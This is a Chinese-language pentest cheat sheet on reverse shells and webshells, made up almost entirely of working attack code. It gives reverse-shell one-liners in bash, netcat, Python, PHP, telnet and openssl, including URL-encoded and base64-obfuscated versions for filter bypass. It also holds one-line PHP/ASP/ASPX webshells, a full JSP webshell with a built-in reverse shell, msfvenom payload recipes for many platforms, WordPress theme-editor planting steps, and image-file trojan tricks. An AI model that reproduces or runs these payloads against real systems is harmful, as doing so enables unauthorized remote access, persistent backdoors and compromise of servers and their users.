# 反弹shell

## 测试可以用于反弹shell的命令

```
which nc sh bash python python3 php exec lua perl ruby
```

## 常见的可以反弹shell的端口：

TCP端口：

- 80 (HTTP)：尝试使用常见的Web应用程序漏洞，如远程代码执行漏洞。
- 443 (HTTPS)：尝试使用SSL/TLS漏洞或Web应用程序漏洞。
- 22 (SSH)：尝试使用SSH漏洞或弱密码进行攻击。
- 23 (Telnet)：尝试使用Telnet漏洞或弱密码进行攻击。
- 3389 (RDP, 远程桌面协议)：尝试使用RDP漏洞或弱密码进行攻击。

UDP端口：

- 53 (DNS)：尝试使用DNS漏洞或缓存投毒攻击。
- 161 (SNMP)：尝试使用SNMP漏洞进行攻击。

# 1、监听接收shell

## NC
```
nc -lp 4444
nc -nlvp 1234
```
## pwncat
```
pwncat -lp 1234
```

# 2、反弹shell playlad

## 反弹 Shell 生成器

[https://www.hyhforever.top/revshell/](https://www.hyhforever.top/revshell/)

[https://forum.ywhack.com/shell.php](https://forum.ywhack.com/shell.php)

## openssl流量加密反弹shell

这个其实之前也知道，单习惯性更多的还是bash直接反弹，但考虑到目标网络流量审计的情况，对于如/etc/shadow等敏感文件的读取，还是采用流量加密为好，一并记录。

```
#生成证书
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

#服务端监听
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

#客户端反弹
mkfifo /tmp/z; /bin/bash -i < /tmp/z 2>&1 | openssl s_client -quiet -connect x.x.x.x:443 > /tmp/z; rm -rf /tmp/z
```


## playlad在线生成

- https://forum.ywhack.com/shell.php


## nc反弹shell

```
nc -e /bin/sh 192.168.56.102 1234
nc -c bash 192.168.56.102 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f
```

## bash TCP反弹shell

```
/bin/sh -i >& /dev/tcp/192.168.56.102/1234 0>&1
/bin/bash -i >& /dev/tcp/192.168.56.102/1234 0>&1
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.102/1234 0>&1"
/bin/bash%20-c%20%22/bin/bash%20-i%20%3E%26%20/dev/tcp/192.168.56.102/1234%200%3E%261%22
bash -c 'exec bash -i &>/dev/tcp/192.168.169.129/1234 <&1'
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODA4MCAwPiYx}|{base64,-d}|{bash,-i}
rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.8.143 8888 1>/tmp/p
```
## Bash UDP反弹shell

```
sh -i >& /dev/udp/127.0.0.1/8080 0>&1
nc -u -lvp 8080
```
## python反弹shell

<https://tool.4xseo.com/a/22182.html>

直接反弹

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

```
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
```

export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

用于命令注入的web环境，命令经过了URL编码

```
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.216.128%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22/bin/bash%22%2C%22-i%22%5D%29%3B%27
```

python2 和Python3 执行bash脚本反弹

```
使用os.system函数：
import os
os.system("bash /tmp/shell.sh")


使用subprocess模块：
import subprocess
subprocess.call(["bash", "/tmp/shell.sh"])


bash脚本
echo '/bin/bash -i >& /dev/tcp/192.168.56.102/8888 0>&1' > /tmp/shell.sh
cat /tmp/shell.sh

```
## find反弹shell

```bash
find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.137.138/12345 0>&1 \;
```

## Telnet反弹shell

```powershell
rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 8080 0/tmp/p 2>&1
```

## php反弹shell

1. `php -r`：执行后面的 PHP 代码。
2. ` $sock=fsockopen("192.168.0.8",7777)`：打开一个到 192.168.0.8 的 7777 端口的 socket 连接。
3. `exec("/bin/sh -i <&3 >&3 2>&3")`：执行/bin/sh命令，并以交互模式运行，并通过 socket 连接读写数据。

#### 1. 使用 `exec` 函数
```php
php -r '$sock=fsockopen("192.168.56.102",1234);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.56.102",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#### 2. 使用 `proc_open` 函数
```php
php -r '$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
```

#### 3. 使用 `shell_exec` 函数
```php
php -r '$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### 4. 使用反引号（shell 命令执行）
```php
php -r '$s=fsockopen("10.10.10.11",443);`/bin/sh -i <&3 >&3 2>&3`;'
```

#### 5. 使用 `system` 函数
```php
php -r '$s=fsockopen("192.168.32.130",7777);system("/bin/sh -i <&3 >&3 2>&3");'
```

#### 6. 使用 `popen` 函数
```php
php -r '$s=fsockopen("192.168.32.130",7777);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```


## 绕过字符限制

### base64绕过

```
echo '/bin/bash -i >& /dev/tcp/192.168.56.131/4444 0>&1'|base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTMxLzQ0NDQgMD4mMQo=

echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTMxLzQ0NDQgMD4mMQo='|base64 -d    
bash -i >& /dev/tcp/192.168.56.131/4444 0>&1
```
利用

```
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTMxLzQ0NDQgMD4mMQo='|base64 -d | /bin/bash
```
# websehll

### PHP webshell
#### 一句话websehll【小马】

原理理解：

- 蚁剑等webshell工具，通过'pass'参数连接带有一句话目标的页面，创建一个可持续访问网站的后门。用户可通过该后门传递可执行代码，从而实现对网站文件的管理。

php的一句话木马：
```php
<?php @eval($_POST['cmd']);?>


<?php @eval($_POST['pass']);?>
<?php phpinfo();@eval($_POST['pass']);?>
"<?php echo system($_GET["pass"]); ?>"
<?php echo system($_get[pass]); ?>
<?php echo system($_REQUEST['pass']);>
<?php fputs(fopen('xie.php','w'),'<? php eval($_POST[xie])?>');?>
```

asp的一句话木马：
```asp
<%eval request('pass')%> 或<% execute(request("pass")) %>
```

aspx的一句话木马：
```aspx
<%@ Page Language='Jscript'%> <%eval(Request.Item['pass'],'unsafe');%>
```

#### PHP websehll【大马】

kali自带webshell存储路径：
```
/usr/share/webshells/asp
/usr/share/webshells/aspx
/usr/share/webshells/cfm
/usr/share/webshells/jsp
/usr/share/webshells/laudanum -> /usr/share/laudanum
/usr/share/webshells/perl
/usr/share/webshells/php
```
常用：
```
/usr/share/webshells/php/php-reverse-shell.php
```

### jsp webshell

#### jsp大马

一个简单的反向以及一个识别操作系统（Windows/Linux）的webshell
```
<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}


    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;

        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));

        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;

        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }

        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( "192.168.119.128", 8081 ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}


%>
</pre>
</body>
</html>
```

#### 用msf生成，并做成war包
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.131 LPORT=7777 -f war -o shell.war

msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.131 LPORT=4444 -f war -o jspshell.war
```
#### Linux java jsp打包war

1、检查jdk环境
```
java -version  [有java但是没有jar命令需要执行安装命令]
sudo apt install openjdk-17-jdk -y
sudo apt install default-jdk -y
```
2、打包
```
sudo jar -cvf shell.war *.jsp
```
#### 触发

```
http://xxx.com/war_name/jsp_name
```

## 链接webshell

### php利用页面

1、寻找可以创建或修改的php页面

```
appearance => editor
```

2、theme上传php页面文件
```
appearance => theme => add new

# 查找wordpress 404.php的位置：
这是编辑404页面时的url，其中有路径位置
http://192.168.56.103/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

根据以上url，得出404的位置是
http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
```
### 蚁剑

- 文档传送门：[[antsword]]
### Behinder（冰蝎）

- 文档传送门：[[Behinder]]
### Weevely

- 文档传送门：[[weevely]]
### Godzilla（哥斯拉）

- 文档传送门：[[Godzilla]]



## MSF for webshell

### 1、Payload生成方式

（1）windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform Windows -f exe > shell.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f exe > shell.exe
```
（2）liunx
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform Linux -f elf > shell.elf
```
（3）mac
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform osx -f macho > shell.macho
```
（4）android
```
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw > shell.apk

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 R > test.apk
```
（5）Powershell
```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
```
（6）shellcode（windows）
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform Windows -f c
```
（7）shellcode（linux）
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform Linux -f c
```
（8）shellcode（mac）
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x86 --platform osx -f c
```

### 2、反弹shell生成方式

（1）python
```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.20.128 LPORT=4444 -f raw > shell.py

msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw > shell.py
```
（2）bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.20.128 LPORT=4444 -f raw > shell.sh
```
（3）Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.20.128 LPORT=4444 -f raw > shell.pl
```
（4）Lua
```
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.20.128 LPORT=4444 -f raw -o shell.lua
```
（5）Ruby
```
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw -o shell.rb
```
（6）php
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
（7）aspx
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f aspx -o shell.aspx
```
（8）asp
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f asp > shell.asp
```
（9）jsp
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw > shell.jsp
```
（10）war
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war > shell.war
```
（11）nodejs
```
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f raw -o shell.js
```
### 3、MSF监听设置
```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST 192.168.20.128
set LPORT 4444
show options #查漏补缺
exploit

```


## 参考资料

- [2021.06.23] - [新型Webshell客户端 Godzilla 哥斯拉](https://github.com/BeichenDream/Godzilla)
- [2021.06.23] - [Behinder “冰蝎”动态二进制加密网站管理客户端](https://github.com/rebeyond/Behinder)
- [2021.06.23] - [AntSword 中国蚁剑是一款开源的跨平台网站管理工具](https://github.com/AntSwordProject/antSword)
- [2021.06.23] - [WebshellManager 一句话WEB端管理工具](https://github.com/boy-hack/WebshellManager)
- [2021.06.23] - [Cknife 跨平台版中国菜刀](https://github.com/Chora10/Cknife)
- [2021.06.23] - [[文章\]23个常见Webshell网站管理工具](https://mp.weixin.qq.com/s/BIeiTDaD6WjfV-raCxI_gQ) 
- http://repository.root-me.org/Exploitation - Web/EN - Webshells In PHP, ASP, JSP, Perl, And ColdFusion.pdf
- https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
- http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
- https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shell
- https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
- https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/

## 图片木马

### 图片一句话制作

Linux系统木马植入执行语句：
```
cat high_hk.php >> new_hk.jpg
```
Windows cmd中：
```
 copy 1.jpg/b+2.php 3.jpg
```

- /b是二进制形式打开
- /a是ascii方式打开

原文链接：https://blog.csdn.net/weixin_53693367/article/details/132393658
